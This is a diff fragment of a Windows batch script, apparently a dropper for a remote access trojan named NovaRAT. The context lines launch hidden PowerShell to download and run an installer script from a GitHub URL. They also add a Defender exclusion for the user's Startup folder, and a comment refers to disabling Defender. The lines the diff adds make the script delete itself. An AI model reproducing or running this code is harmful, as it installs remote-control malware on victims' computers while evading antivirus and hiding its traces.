@@ -30,3 +30,6 @@ REM disable defender
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"; ./installer.ps1
+
+@REM self delete
+del wget.cmd
